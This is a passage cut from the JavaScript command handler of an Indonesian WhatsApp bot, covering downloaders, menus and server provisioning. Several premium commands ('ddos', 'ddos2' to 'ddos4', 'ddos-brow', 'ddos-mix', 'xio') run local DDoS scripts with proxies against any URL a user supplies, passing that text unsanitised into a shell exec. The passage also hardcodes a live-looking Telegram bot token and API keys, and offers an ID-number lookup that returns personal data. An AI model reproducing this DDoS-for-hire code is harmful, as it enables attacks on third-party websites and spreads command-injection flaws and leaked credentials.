reply(`${spotify}`)
break

/*case 'ddos1:
if (!isPrem) return reply(mess.prem)
if (!text) return reply(`Example : ${prefix + command} [url]`)
reply(`A DDoS attack has been executed against the targeted Website:\n\n> TARGET : ${text}\n> TIME : 60\n> THREAD : 20\n> RATE : 100\n\nThank you for your patience.\n`);
exec(`node ./database/ddos/ddos-brow.js ${text} 60 20 100`, (err, stdout) => {
if (err) return console.log(err.toString())
if (stdout) return console.log(util.format(stdout))
})
break*/
case 'ddos2': case 'ddos-egao': {
if (!isPrem) return reply(mess.prem)
let url = text.split(" ")[0]
let time = text.split(" ")[1]
let thread = text.split(" ")[2]
let rate = text.split(" ")[3]
if (args.length === 4 && url && time && thread && rate) {
reply(`Please wait a moment, it is in process 🕧. A DDoS attack has been executed against the destination Website: ${url} 👤 This process is expected to take ${time} seconds. Thank you for your patience.`);
exec(`node ./lib/database/ddos/ddos-hentai.js ${url} ${time} ${rate} ${thread} proxy.txt`, (err, stdout) => {
if (err) return console.log(err.toString())
if (stdout) return console.log(util.format(stdout))
})
} else {
reply(`Example : ${prefix + command} [url] [time] [thread] [rate]`)
}
}
break

case 'ddos3': {
if (!isPrem) return reply(mess.premium)
let url = text.split(" ")[0]
let time = text.split(" ")[1]
let thread = text.split(" ")[2]
let rate = text.split(" ")[3]
if (args.length === 4 && url && time && thread && rate) {
reply(`Please wait a moment, it is in process 🕧. A DDoS attack has been executed against the destination Website: ${url} 👤 This process is expected to take ${time} seconds. Thank you for your patience.`);
exec(`node ./lib/database/ddos/ddos-bypass.js ${url} ${time} ${rate} ${thread} proxy.txt`, (err, stdout) => {
if (err) return console.log(err.toString())
if (stdout) return console.log(util.format(stdout))
})
} else {
reply(`Example : ${prefix + command} [url] [time] [thread] [rate]`)
}
}
break

case 'ddos4': {
if (!isPrem) return reply(mess.premium)
let url = text.split(" ")[0]
let time = text.split(" ")[1]
let thread = text.split(" ")[2]
let rate = text.split(" ")[3]
if (args.length === 4 && url && time && thread && rate) {
reply(`Please wait a moment, it is in process 🕧. A DDoS attack has been executed against the destination Website: ${url} 👤 This process is expected to take ${time} seconds. Thank you for your patience.`);
exec(`node ./lib/database/ddos/ddos-hentai.js ${url} ${time} ${rate} ${thread} proxy.txt`, (err, stdout) => {
if (err) return console.log(err.toString())
if (stdout) return console.log(util.format(stdout))
})
} else {
reply(`Example : ${prefix + command} [url] [time] [thread] [rate]`)
}
}
break

case 'ddos-brow': {
if (!isPrem) return reply(mess.prem)
if (!text) return reply(`Example : ${prefix + command} [url]`)
reply(`A DDoS attack has been executed against the targeted Website:\n\n> TARGET : ${text}\n> TIME : 60\n> THREAD : 20\n> RATE : 100\n\nThank you for your patience.\n`);
exec(`node ./lib/database/ddos/ddos-brow.js ${text} 60 20 100`, (err, stdout) => {
if (err) return console.log(err.toString())
if (stdout) return console.log(util.format(stdout))
})
}
break
case 'ddos-mix': {
if (!isPrem) return reply(mess.prem)
if (!text) return reply(`Example : ${prefix + command} [url]`)
reply(`A DDoS attack has been executed against the targeted Website:\n\n> TARGET : ${text}\n> TIME : 60\n> THREAD : 20\n> RATE : 100\n\nThank you for your patience.\n`);
exec(`node ./lib/database/ddos/ddos-mix.js ${text} 60 20 100`, (err, stdout) => {
if (err) return console.log(err.toString())
if (stdout) return console.log(util.format(stdout))
})
}
break

case 'ddos': case 'mix':{
	if (!isPrem) return m.reply('lu siapa kocak😂, kalo mo make buy prem sini atau beli emcenya🐧')
 if (!text.includes(' ')) return reply(`Use Methode: .${command} <target> <time>\nExaple: .${command} example.my.id 60`)
 const targetweb = text.substring(0, text.indexOf(' ') - 0)
 const timeweb = text.substring(text.lastIndexOf(' ') + 1) 
 reply(`*Bot Sedang Attack Tunggu Hasilnya*
• *Target* -> [ ${targetweb} ]
• *Time Attack* -> [ ${timeweb} ]`)
 exec(`node ./lib/database/ddos/ddos.js ${targetweb} ${timeweb}`, { maxBuffer: 1024 * 1024 }, (error, stdout, stderr) => {
 if (error) {
 reply(`Error: ${error.message}`);
 return;
 }
 if (stderr) {
 reply(`Error: ${stderr}`);
 return;
 }
 reply(`Success\n\n• Target: ${targetweb},\n• Time: ${timeweb}`);
 }); 
 }
 break

case 'telestik':
case 'stiktele':
case 'telesticker': {
 async function telesticker(url) {
 return new Promise(async (resolve, reject) => {
 const packName = url.replace("https://t.me/addstickers/", "");
 const data = await axios(`https://api.telegram.org/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getStickerSet?name=${encodeURIComponent(packName)}`, {
 method: "GET",
 headers: { "User-Agent": "GoogleBot" }
 });

 const hasil = [];
 for (let i = 0; i < data.data.result.stickers.length; i++) {
 const fileId = data.data.result.stickers[i].thumb.file_id;
 const data2 = await axios(`https://api.telegram.org/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getFile?file_id=${fileId}`);
 const result = {
 url: "https://api.telegram.org/file/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/" + data2.data.result.file_path
 };
 hasil.push(result.url);
 }
 resolve(hasil);
 });
 }

 if (!text) return reply(`Masukan Imput Url\n\nExample: ${prefix + command} https://t.me/addstickers/video_5609982615_by_prinzeugen_robot`);

 let results = await telesticker(text);
 if (results.length > 0) {
 m.reply(mess.wait);
 results.forEach((result) => {
 ptz.sendFile(m.chat, result, 'wms.webp', '', m, false, { asSticker: true });
 });
 } else {
 reply('Tidak Ada Hasil.');
 }
}
break

case 'xio': {
if (!isPrem) return
if (!text) return reply(`*Example*: ${prefix + command} [url]`)
reply(`Serangan DDoS telah dieksekusi ke Situs Web yang dituju:\n\n> TARGET : ${text}\n> TIME : 60\n> THREAD : 20\n> RATE : 100\n\nTerima kasih atas kesabaran Anda.\n`);
exec(`node ./lib/database/ddos/kyuu.js ${text} 60 20 100`, (err, stdout) => {
if (err) return console.log(err.toString())
if (stdout) return console.log(util.format(stdout))
})
}
break

case "owner": {
ptz.sendContact(m.chat, [owner], "Telfon/VC = Blokir", null, {contextInfo: {
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true, 
thumbnailUrl: 'https://files.catbox.moe/qrrmon.jpg', 
title: `© Copyright ${global.ownername}`, 
renderLargerThumbnail: true, 
sourceUrl: youtube, 
mediaType: 1
}}})
}
break

case 'play2': {
 await ptz.sendMessage(m.chat, { react: { text: "🎶", key: m.key } });
 
 if (!text) return reply('Enter Title / Link From YouTube!');

 try {
 let search = await yts(text);
 let anup3k = search.videos[0];
 let { title, thumbnail, timestamp, views, url } = anup3k;

 // Menggunakan API untuk mengunduh audio dengan API key
 const response = await fetch(`https://widipe.com/download/ytdl?url=${url}`);

 // Periksa apakah respon ok
 if (!response.ok) {
 throw new Error(`HTTP error! status: ${response.status}`);
 }

 const procees = await response.json();

 // Memastikan hasil dari API berhasil
 if (procees.status !== 'success') {
 return reply(`Error: ${procees.message}`);
 }

 let doc = {
 audio: {
 url: procees.result.mp3
 },
 mimetype: 'audio/mp4',
 fileName: `${title}.mp3`,
 contextInfo: {
 externalAdReply: {
 showAdAttribution: true,
 mediaType: 2,
 mediaUrl: url,
 title: title,
 body: `${views} views | ${timestamp} duration`,
 thumbnailUrl: thumbnail,
 sourceUrl: url
 }
 }
 };

 await ptz.sendMessage(m.chat, doc, { quoted: m });
 } catch (e) {
 // Tampilkan detail error ke konsol
 console.error(e);
 reply('*Terjadi error :* ' + e.message);
 }
}
break

case 'send': case 'sendfitur': {
if (!isPrem) return reply(mess.owner);
if (!m.quoted) return reply('Kutip pesan seseorang!');
if (!text) return reply(`Contoh: ${prefix+command} menu`);
const getCase = async (caseName) => {
try {
const fileContent = await fs.promises.readFile("./message.js", "utf-8");
const caseRegex = new RegExp(`case '${caseName}'[\\s\\S]*?break`, 'g');
const match = fileContent.match(caseRegex);
if (!match) {
return reply(`Case '${caseName}' tidak ditemukan.`);
}
return match[0];
} catch (error) {
return reply(`Terjadi kesalahan saat membaca file: ${error.message}`);
}};
const caseName = text.trim();
getCase(caseName)
.then(caseCode => {
const recipient = m.quoted ? m.quoted.sender : m.mentionedJid[0];
if (!recipient || !recipient.includes('@s.whatsapp.net')) {
return reply('Format ID WhatsApp tidak valid!');
}
const sendFeature = async (recipient, caseCode) => {
try {
const contact = (await ptz.onWhatsApp(recipient.split('@')[0]))[0] || {};
if (!contact) return reply('Kontak tidak ditemukan di WhatsApp.');
const message = `Hi, kamu dapet kiriman fitur nih!\n\n${caseCode}`;
await ptz.sendMessage(recipient, { text: message }, { quoted: m });
reply('Fitur berhasil terkirim!');
} catch (error) {
console.error('Terjadi kesalahan:', error.message);
reply('Terjadi kesalahan saat mengirim fitur: ' + error.message);
}};
sendFeature(recipient, caseCode);
})
.catch(error => reply(`Terjadi kesalahan: ${error.message}`));
}
break;

case 'autoread':
 if (!isPrem) return reply(mess.owner)
 if (args.length < 1) return reply(`Example ${prefix + command} on/off`)
 if (text === 'on') {
 autoread = true
 reply(`Successfully changed autoread to ${text}`)
 } else if (text === 'off') {
 autoread = false
 reply(`Successfully changed autoread to ${text}`)
 }
 break

case 'getfunc':
if (!isPrem) return 
if (!text) return reply(`Contoh penggunaan: ${prefix+command} const reply`)
const getfunc = (funcc) => {
return `'${funcc}'`+fs.readFileSync('./message.js').toString().split(`+funcc+`)[1].split('')
}
reply(`${getfunc(text)}`)
break

case 'ytmp36':{
 if (!text) return reply(`*Example:* ${command} link YouTube`)
 reply(mess.wait)
 try {
let ryz = `https://api.ryzendesu.vip/api/downloader/y2mate?url=${text}`
let down = `https://api.ryzendesu.vip/api/downloader/ytmp4?url=${text}`
let desu = await (await fetch(ryz)).json();
let url = await (await fetch(down)).json();
let result = desu.download
let downloadUrl = url.url
await ptz.sendMessage(m.chat, { 
 audio: { url: downloadUrl }, 
 mimetype: 'audio/mp4', contextInfo: {
 externalAdReply: {
 title: result.title,
 body: `author: ${result.author.name}`,
 thumbnailUrl: result.thumbnail,
 mediaType: 1,
 showAdAttribution: false,
 renderLargerThumbnail: true,
 },
 }, 
 }, { quoted: m });
} catch (e) {
 console.log(e)
 reply(mess.err)
}}
break

case "listgc":{
if (!isPrem) return (`ᴋʜᴜsᴜs ${ownername} ᴀᴋ ʟᴏʟ ᴡᴋᴡᴋ`)
let getGroups = await ptz.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
let hituet = 0
let teks = `⬣ *LIST GROUP DI BAWAH*\n\nTotal Group : ${anu.length} Group\n\n`
for (let x of anu) {
let metadata2 = await ptz.groupMetadata(x)
teks += `❏ Group Ke ${hituet+=1}\n│⭔ *NAMA :* ${metadata2.subject}\n│⭔ *ID :* ${metadata2.id}\n│⭔ *MEMBER :* ${metadata2.participants.length}\n╰────|\n\n`
}
reply(teks + `Untuk Penggunaan Silahkan Ketik Command ${prefix}pushkontakv1 id|teks\n\nSebelum Menggunakan Silahkan Salin Dulu ID Group Nya Di Atas`)
}
break

case 'ytmp3': case 'ytmp4': {
if (!text) return reply(`*Example:* ${prefix + command} https://www.youtube.com/watch?v=zzzz`)
 let type = ["yta2","ytmp36"].includes(command) ? "mp3":"mp4"
 let v= type =="mp3" ? "audio":"video"
 try {
 const response = await fetch(`https://ai.xterm.codes/api/downloader/youtube?url=${encodeURIComponent(text)}&type=${type}&apikey=${API.XTREM}`)
 const result = await response.json()

 if (result.status && result.data && result.data.dlink) {
 await ptz.sendMessage(m.chat, { 
 [v]: { url: result.data.dlink }, 
 mimetype: type == "mp3" ? 'audio/mpeg' : 'video/mp4'
 }, { quoted: m })
 } else {
 throw 'Error: Unable to fetch audio'
 }
 } catch (error) {
 throw error
 }
}
break

case 'luminai': case 'lumin':{
await ptz.sendMessage(m.chat, { react: { text: "👌", key: m.key } });
 if (!text) return reply("Mau nanya apa ?");
 const requestData = { content: text, user: m.sender };
 const quoted = m && (m.quoted || m);
 
 try {
 let response;
 if (quoted && /image/.test(quoted.mimetype || quoted.msg.mimetype)) {
 requestData.imageBuffer = await quoted.download();
 }
 
 response = (await axios.post('https://luminai.my.id', requestData)).data.result;
 reply(response);
 } catch (e) {
 reply(e.message);
 }
}
break

case 'ceknik':{
if (!text) return reply(`*Example:* ${prefix + command} Nik ktp`)
let ana = await fetchJson(`https://api.maulanaa.xyz/tools/ceknik?apikey=${API.MAULANA}&text=${text}`)
let caption = `Status: *${ana.status}*
Pesan : ${ana.pesan}

Nik : *${ana.data.nik}*
Kelamin : *${ana.data.kelamin}*
Lahir : *${ana.data.lahir}*
Provinsi : *${ana.data.provinsi}*
Kota/Kabupaten : *${ana.data.kotakab}*
Kecamatan : *${ana.data.kecamatan}*
Uniqcode : *${ana.data.uniqcode}*
Kodepos : *${ana.data.tambahan.kodepos}*
Pasaran : *${ana.data.tambahan.pasaran}*
Umur : *${ana.data.tambahan.usia}*
Ultah : *${ana.data.tambahan.ultah}*
Zodiak : *${ana.data.tambahan.zodiak}*

*Cek Nik KTP from Api* https://api.maulanaa.xyz `

ptz.sendMessage(m.chat, { text: caption},{quoted:m})
}
break

case 'teraboxxx':
case 'teraboxdl': {
if (!isPrem) return 
 if(!text) return reply('linknya mana kak')
reply(`Sedang Proses Permintaan...`)
 const response = await fetch(`https://api.alyachan.dev/api/terabox?url=${encodeURIComponent(text)}&apikey=mBK310`);
const data = await response.json();
const downloadLink = data.data.url;
const caption = data.data.filename;
const responseHeaders = response.headers;
const mimeType = responseHeaders.get('content-type');
ptz.sendMessage(m.chat, { document: { url: downloadLink, mimetype: mimeType }, fileName: caption }, { quoted: m });

}
break

case 'ceklimit': 
case 'checklimit': 
case 'limit':{
let user = global.db.data.users[m.sender]
if (user.registered === false) return reply('silakan regis');
if (!isPrem && global.db.data.users[m.sender].limit < 0) return reply(mess.endLimit) 
db.data.users[m.sender].limit -= 0
let ARC = `× *Username* : ${pushname}
× *Limit* : ${user.limit}
× *level* : ${user.level}
× *Status* : ${user.premium}`
await ptz.sendMessage(m.chat, {
text: ARC,
contextInfo: {
externalAdReply: { 
title: botname,
body: hariini,
thumbnailUrl: 'https://telegra.ph/file/977f57c103336bd2072aa.jpg',
sourceUrl: saluran,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fpayment})
}
break

case 'menu2': {
//let name = m.pushName || Lily.getName(m.sender);
let pan = `
▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
> *Halo Kak \`${pushname}\`, Tekan Tombol Yang bertuliskan Chat Owner Untuk Menghubungi Nomor Owner ku*
▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
`;
const url = `https://a.top4top.io/p_3235ux4481.jpg`;
async function image(url) {
 const { imageMessage } = await generateWAMessageContent({
 image: {
 url
 }
 }, {
 upload: ptz.waUploadToServer
 });
 return imageMessage;
}
let msg = generateWAMessageFromContent(
 m.chat,
 {
 viewOnceMessage: {
 message: {
 interactiveMessage: {
 body: {
 text: pan
 },
 carouselMessage: {
 cards: [
 {
 header: {
 imageMessage: await image(url),
 hasMediaAttachment: true,
 },
 body: {
 text: `
┏───────────────┈ 
┆ 「 *\`[OWNER BOT]\`* 」
┣───────────────┈ 
┣──=[ *\`[ ${global.ownername} ]\`* ]==─
┆ • Jangan Chat Yang Aneh Aneh
┆ • Jangan Telpon/Call Owner 
┆ • Chat Langsung ke intinya aja
┆ • Klo Ada Uang Minimal Bagi
└────────────┈ ⳹`
 },
 nativeFlowMessage: {
 buttons: [
 {
 name: "cta_url",
 buttonParamsJson: `{"display_text":"👤 Chat Owner ( ${global.pembuat} )","url":"https://wa.me/${global.owner}","merchant_url":"https://wa.me/${global.owner}"}`
 },
 ],
 },
 },
 {
 header: {
 imageMessage: await image(url),
 hasMediaAttachment: true,
 },
 body: {
 text: `
┏───────────────┈ 
┆ 「 *\`[NOMOR BOT]\`* 」
┣───────────────┈ 
┣──=[ *\`[ ${botname} ]\`* ]==─
┆ • Jangan Spam Bot
┆ • Jangan Telpon/Call Bot 
┆ • Gaudah Chat Yg Aneh Aneh
┆ • Beli Prem Dll Chat Owner
└────────────┈ ⳹`
 },
 nativeFlowMessage: {
 buttons: [
 {
 name: "cta_url",
 buttonParamsJson: `{"display_text":" 💬 Chat Bot ( ${botname} )","url":"https://wa.me/${global.owner}","merchant_url":"https://wa.me/${global.owner}"}`
 },
 ],
 },
 },
{
 header: {
 imageMessage: await image(url),
 hasMediaAttachment: true,
 },
 body: {
 text: `
┏───────────────┈ 
┆ 「 *\`[NOMOR BOT]\`* 」
┣───────────────┈ 
┣──=[ *\`[ ${botname} ]\`* ]==─
┆ • Jangan Spam Bot
┆ • Jangan Telpon/Call Bot 
┆ • Gaudah Chat Yg Aneh Aneh
┆ • Beli Prem Dll Chat Owner
└────────────┈ ⳹`
 },
 nativeFlowMessage: {
 buttons: [
 {
 name: "cta_url",
 buttonParamsJson: `{"display_text":" 💬 Chat Bot ( ${botname} )","url":"https://wa.me/${global.owner}","merchant_url":"https://wa.me/${global.owner}"}`
 },
 ],
 },
 },
 ],
 messageVersion: 1,
 },
 },
 },
 },
 },
 {}
);

await ptz.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id,
});

}
 break

case '5gb': {
if (!isPrem) return reply(mess.owner)
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location3
let memo = "5130"
let cpu = "150"
let disk = "5130"
let email = username + "1398@gmail.com"
try {
if (!u) return
let d = (await ptz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})

const ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
ptz.sendMessage(u, { caption: ctf, image: fs.readFileSync("./Thumb.jpg") });
let data2 = await f2.json();


let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": "if [[ -d .git ]] && [[ \${AUTO_UPDATE} == \"1\" ]]; then git pull; fi; if [[ ! -z \${NODE_PACKAGES} ]]; then /usr/local/bin/npm install \${NODE_PACKAGES}; fi; if [[ ! -z \${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall \${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/\${CMD_RUN}",
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)
} catch {
 reply('yah gagal om...\n_silakan cek api plta dan pltc anda_')
}
}

break

case 'applesearch': case 'aps': {
const appleMusic = {
 search: async (query) => {
 const url = `https://music.apple.com/us/search?term=${query}`;
 try {
 const { data } = await axios.get(url);
 const $ = cheerio.load(data);
 const results = [];
 $('.desktop-search-page .section[data-testid="section-container"] .grid-item').each((index, element) => {
 const title = $(element).find('.top-search-lockup__primary__title').text().trim();
 const subtitle = $(element).find('.top-search-lockup__secondary').text().trim();
 const link = $(element).find('.click-action').attr('href');

 results.push({
 title,
 subtitle,
 link
 });
 });

 return results;
 } catch (error) {
 console.error("Error:", error.response ? error.response.data : error.message);
 return { success: false, message: error.message };
 }
 },
 detail: async (url) => {
 try {
 const { data } = await axios.get(url);
 const $ = cheerio.load(data);
 const albumTitle = $('h1[data-testid="non-editable-product-title"]').text().trim();
 const artistName = $('a[data-testid="click-action"]').first().text().trim();
 const releaseInfo = $('div.headings__metadata-bottom').text().trim();
 const description = $('div[data-testid="description"]').text().trim();

 const result = {
 albumTitle,
 artistName,
 releaseInfo,
 description
 };

 return result;
 } catch (error) {
 console.error("Error:", error.response ? error.response.data : error.message);
 return { success: false, message: error.message };
 }
 }
}

if (!text) return reply("nama lagu nya?")
const hasil = await appleMusic.search(text)

let no = 1
let capt = `々──── *[ AppleMusic - Search ]* ──々\n\n`
for (let i of hasil) {
capt += `╭──── *[ ${no++} ]* ──々\n`
capt += `│ =〆 ᴛɪᴛʟᴇ : ${i.title}\n`
capt += `│ =〆 sᴜʙᴛɪᴛʟᴇ : ${i.subtitle}\n`
capt += `│ =〆 ʟɪɴᴋ : ${i.link}\n`
capt += `╰─々\n\n`
}

reply(`${capt}`)
}
break

case 'appledownload': case 'apdl': {
const appledown = {
 getData: async (urls) => {
 const url = `https://aaplmusicdownloader.com/api/applesearch.php?url=${urls}`;
 try {
 const response = await axios.get(url, {
 headers: {
 'Accept': 'application/json, text/javascript, */*; q=0.01',
 'X-Requested-With': 'XMLHttpRequest',
 'User-Agent': 'MyApp/1.0',
 'Referer': 'https://aaplmusicdownloader.com/'
 }
 });
 return response.data;
 } catch (error) {
 return { success: false, message: error.message };
 console.error("Error:", error.response ? error.response.data : error.message);
 }
 },
 getAudio: async (trackName, artist, urlMusic, token) => {
 const url = 'https://aaplmusicdownloader.com/api/composer/swd.php';
 const data = {
 song_name: trackName,
 artist_name: artist,
 url: urlMusic,
 token: token
 };
 const headers = {
 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
 'Accept': 'application/json, text/javascript, */*; q=0.01',
 'X-Requested-With': 'XMLHttpRequest',
 'User-Agent': 'MyApp/1.0',
 'Referer': 'https://aaplmusicdownloader.com/song.php#'
 };
 try {
 const response = await axios.post(url, qs.stringify(data), { headers });
 const downloadLink = response.data.dlink;
 return downloadLink;
 } catch (error) {
 return { success: false, message: error.message };
 console.error("Error:", error.response ? error.response.data : error.message);
 }
 },
 download: async (urls) => {
 const musicData = await appledown.getData(urls);
 if (musicData) {
 const encodedData = encodeURIComponent(JSON.stringify([
 musicData.name,
 musicData.albumname,
 musicData.artist,
 musicData.thumb,
 musicData.duration,
 musicData.url
 ]));
 const url = 'https://aaplmusicdownloader.com/song.php';
 const headers = {
 'authority': 'aaplmusicdownloader.com',
 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
 'cache-control': 'max-age=0',
 'content-type': 'application/x-www-form-urlencoded',
 'origin': 'https://aaplmusicdownloader.com',
 'referer': 'https://aaplmusicdownloader.com/',
 'user-agent': 'MyApp/1.0'
 };
 const data = `data=${encodedData}`;
 try {
 const response = await axios.post(url, data, { headers });
 const htmlData = response.data;
 const $ = cheerio.load(htmlData);
 const trackName = $('td:contains("Track Name:")').next().text();
 const albumName = $('td:contains("Album:")').next().text();
 const duration = $('td:contains("Duration:")').next().text();
 const artist = $('td:contains("Artist:")').next().text();
 const thumb = $('figure.image img').attr('src');
 const urlMusic = urls;
 const token = $('a#download_btn').attr('token');
 const downloadLink = await appledown.getAudio(trackName, artist, urlMusic, token);

 const extractedData = {
 name: trackName,
 albumname: albumName,
 artist: artist,
 url: urlMusic,
 thumb: thumb,
 duration: duration,
 token: token,
 download: downloadLink
 };
 return extractedData;
 } catch (error) {
 return { success: false, message: error.message };
 console.error("Error:", error.response ? error.response.data : error.message); 
 }
 }
 }
}

if (!text.includes('music.apple.com')) return reply(`• *Example :* .${command} https://music.apple.com/xxxxxxx`)
let audioap = await appledown.download(text)

let applecap = `╭──── *[ ᴀᴘᴘʟᴇᴍᴜsɪᴄ - ᴅʟ ]* ──々
│ =〆 ɴᴀᴍᴇ : ${audioap.name}
│ =〆 ᴀʟʙᴜᴍ : ${audioap.albumname}
│ =〆 ᴅᴜʀᴀᴛɪᴏɴ : ${audioap.duration}
│ =〆 ᴜʀʟ : ${audioap.url}
╰─々
`;

await ptz.sendMessage(m.chat, {
text: applecap, 
mimetype: 'audio/mpeg',
 contextInfo: {
 isForwarded: true,
 forwardingScore: 99999,
 externalAdReply: {
 showAdAttribution: true,
 title: audioap.name,
 mediaType: 1,
 previewType: 1,
 body: audioap.albumname,
 //previewType: "PHOTO",
 thumbnailUrl: audioap.thumb,
 renderLargerThumbnail: true,
 mediaUrl: audioap.url,
 sourceUrl: audioap.url
 }, 
 forwardedNewsletterMessageInfo: {
 newsletterJid: idch,
 serverMessageId: -1,
 newsletterName: `Yt Downloader By: ${ownername}`
 }
 }
}, { quoted: m })

await ptz.sendMessage(m.chat, {
audio: {
url: audioap.download
},
mimetype: 'audio/mpeg',
 contextInfo: {
 isForwarded: true,
 forwardingScore: 99999,
 externalAdReply: {
 showAdAttribution: true,
 title: audioap.name,
 mediaType: 1,
 previewType: 1,
 body: audioap.albumname,
 //previewType: "PHOTO",
 thumbnailUrl: audioap.thumb,
 renderLargerThumbnail: false,
 mediaUrl: audioap.url,
 sourceUrl: audioap.url
 }
 }
}, { quoted: m })
}
break

case 'playap': {
const appleMusic = {
 search: async (query) => {
 const url = `https://music.apple.com/us/search?term=${query}`;
 try {
 const { data } = await axios.get(url);
 const $ = cheerio.load(data);
 const results = [];
 $('.desktop-search-page .section[data-testid="section-container"] .grid-item').each((index, element) => {
 const title = $(element).find('.top-search-lockup__primary__title').text().trim();
 const subtitle = $(element).find('.top-search-lockup__secondary').text().trim();
 const link = $(element).find('.click-action').attr('href');

 results.push({
 title,
 subtitle,
 link
 });
 });

 return results;
 } catch (error) {
 console.error("Error:", error.response ? error.response.data : error.message);
 return { success: false, message: error.message };
 }
 },
 detail: async (url) => {
 try {
 const { data } = await axios.get(url);
 const $ = cheerio.load(data);
 const albumTitle = $('h1[data-testid="non-editable-product-title"]').text().trim();
 const artistName = $('a[data-testid="click-action"]').first().text().trim();
 const releaseInfo = $('div.headings__metadata-bottom').text().trim();
 const description = $('div[data-testid="description"]').text().trim();

 const result = {
 albumTitle,
 artistName,
 releaseInfo,
 description
 };

 return result;
 } catch (error) {
 console.error("Error:", error.response ? error.response.data : error.message);
 return { success: false, message: error.message };
 }
 }
}

const appledown = {
 getData: async (urls) => {
 const url = `https://aaplmusicdownloader.com/api/applesearch.php?url=${urls}`;
 try {
 const response = await axios.get(url, {
 headers: {
 'Accept': 'application/json, text/javascript, */*; q=0.01',
 'X-Requested-With': 'XMLHttpRequest',
 'User-Agent': 'MyApp/1.0',
 'Referer': 'https://aaplmusicdownloader.com/'
 }
 });
 return response.data;
 } catch (error) {
 return { success: false, message: error.message };
 console.error("Error:", error.response ? error.response.data : error.message);
 }
 },
 getAudio: async (trackName, artist, urlMusic, token) => {
 const url = 'https://aaplmusicdownloader.com/api/composer/swd.php';
 const data = {
 song_name: trackName,
 artist_name: artist,
 url: urlMusic,
 token: token
 };
 const headers = {
 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
 'Accept': 'application/json, text/javascript, */*; q=0.01',
 'X-Requested-With': 'XMLHttpRequest',
 'User-Agent': 'MyApp/1.0',
 'Referer': 'https://aaplmusicdownloader.com/song.php#'
 };
 try {
 const response = await axios.post(url, qs.stringify(data), { headers });
 const downloadLink = response.data.dlink;
 return downloadLink;
 } catch (error) {
 return { success: false, message: error.message };
 console.error("Error:", error.response ? error.response.data : error.message);
 }
 },
 download: async (urls) => {
 const musicData = await appledown.getData(urls);
 if (musicData) {
 const encodedData = encodeURIComponent(JSON.stringify([
 musicData.name,
 musicData.albumname,
 musicData.artist,
 musicData.thumb,
 musicData.duration,
 musicData.url
 ]));
 const url = 'https://aaplmusicdownloader.com/song.php';
 const headers = {
 'authority': 'aaplmusicdownloader.com',
 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
 'cache-control': 'max-age=0',
 'content-type': 'application/x-www-form-urlencoded',
 'origin': 'https://aaplmusicdownloader.com',
 'referer': 'https://aaplmusicdownloader.com/',
 'user-agent': 'MyApp/1.0'
 };
 const data = `data=${encodedData}`;
 try {
 const response = await axios.post(url, data, { headers });
 const htmlData = response.data;
 const $ = cheerio.load(htmlData);
 const trackName = $('td:contains("Track Name:")').next().text();
